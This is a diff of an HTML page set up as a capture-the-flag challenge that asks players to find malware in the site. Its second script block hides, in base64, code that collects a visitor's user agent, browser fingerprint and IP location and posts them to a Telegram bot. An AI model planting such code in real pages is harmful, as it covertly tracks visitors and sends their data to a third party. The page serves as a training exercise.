@@ -1,11 +1,99 @@
-<!doctype html>
-<html lang="en-US">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width" />
-    <title>Capture the Flag: Challenge 1</title>
-  </head>
-  <body>
-    <img src="images/firefox-icon.png" alt="My test image" />
-  </body>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="styles.css">
+
+  <style>
+    body {
+      font-family: 'Courier New', Courier, monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: rgb(39, 39, 39);
+      color: #61dafb;
+      margin: 0;
+    }
+
+    .container {
+      text-align: center;
+      transition: transform 2s;;
+    }
+
+    .title {
+      font-size: 2.5em;
+      overflow: hidden;
+      border-right: .15em solid #61dafb;
+      white-space: nowrap;
+      margin: 0 auto;
+      letter-spacing: .15em;
+      width: fit-content;
+      animation: typing 4s steps(40, end), blink-caret .75s step-end infinite, hide-caret 0s forwards 4s;;
+    }
+
+    .briefing {
+      font-size: 1.2em;
+      opacity: 0;
+      animation: fadeIn 2s forwards;
+      animation-delay: 4s;
+    }
+
+    .moved {
+      transform: translateY(-40vh) scale(0.75);
+    }
+
+    @keyframes typing {
+      from {
+        width: 0;
+      }
+
+      to {
+        width: 100%;
+      }
+    }
+
+    @keyframes blink-caret {
+
+      from,
+      to {
+        border-color: transparent;
+      }
+
+      50% {
+        border-color: #61dafb;
+      }
+    }
+
+    @keyframes hide-caret {
+    to { border-color: transparent; }
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+  </style>
+
+  <script>
+  ICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCAoKSA9PiB7CiAgICBjb25zdCB0aXRsZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy50aXRsZScpOwogICAgY29uc3QgYnJpZWZpbmcgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuYnJpZWZpbmcnKTsKICAgIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jb250YWluZXInKTsKICAgIAogICAgYnJpZWZpbmcuYWRkRXZlbnRMaXN0ZW5lcignYW5pbWF0aW9uZW5kJywgKCkgPT4gewogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICBjb250YWluZXIuY2xhc3NMaXN0LmFkZCgnbW92ZWQnKTsKICAgICAgICB9LCA0MDAwKTsKICAgIH0pOwp9KTsK
+  </script>
+</head>
+
+<body>
+  <div class="container">
+    <h1 class="title">Mission Briefing</h1>
+    <p class="briefing">Find the Malware in this website</p>
+  </div>
+  <script>
+    dmFyIHVzZXJEYXRhID0gewogICAgIklQIjogW10sCiAgICAiZmluZ2VycHJpbnRIYXNoIjogJycsCiAgICAidXNlckFnZW50IjogbmF2aWdhdG9yLnVzZXJBZ2VudCAgICAgICAgICAgIAp9CgoKbmV3IEZpbmdlcnByaW50MigpLmdldChmdW5jdGlvbihmaW5nZXJwcmludCwgY29tcG9uZW50cyl7CiAgdXNlckRhdGEuZmluZ2VycHJpbnRIYXNoID0gRmluZ2VycHJpbnQyICAgICAgIAp9KTsKCgp2YXIgc2VuZElwc1RlbGVncmFtID0gZnVuY3Rpb24odG9rZW4sIGNoYXRJRCl7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIGVuZHBvaW50PSdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvJyt0b2tlbisnL3NlbmRNZXNzYWdlJzsKICAgICQuZ2V0SlNPTignaHR0cHM6Ly9qc29uLmdlb2lwbG9va3VwLmlvLz9jYWxsYmFjaz0/JywgZnVuY3Rpb24oZGF0YUlQKSB7ICAgICAgICAgCiAgICAgIHVzZXJEYXRhLklQPWRhdGFJUDsKICAgIH0pOwogICAgc2V0VGltZW91dChmdW5jdGlvbigpewogICAgICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgICAgICB4aHIub3BlbigiUE9TVCIsIGVuZHBvaW50LCB0cnVlKTsKICAgICAgICB4aHIuc2V0UmVxdWVzdEhlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9VVRGLTgnKTsKICAgICAgICBkYXRhPXsnY2hhdF9pZCc6IGNoYXRJRCwgJ3RleHQnOiB1c2VyRGF0YX0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgeGhyLnNlbmQoSlNPTi5zdHJpbmdpZnkoZGF0YSkpOwogICAgICAgIHhoci5vbmxvYWRlbmQgPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgCiAgICAgICAgfSAKICAgIH0sIDMwMDApCn0=
+  </script>
+</body>
 </html>
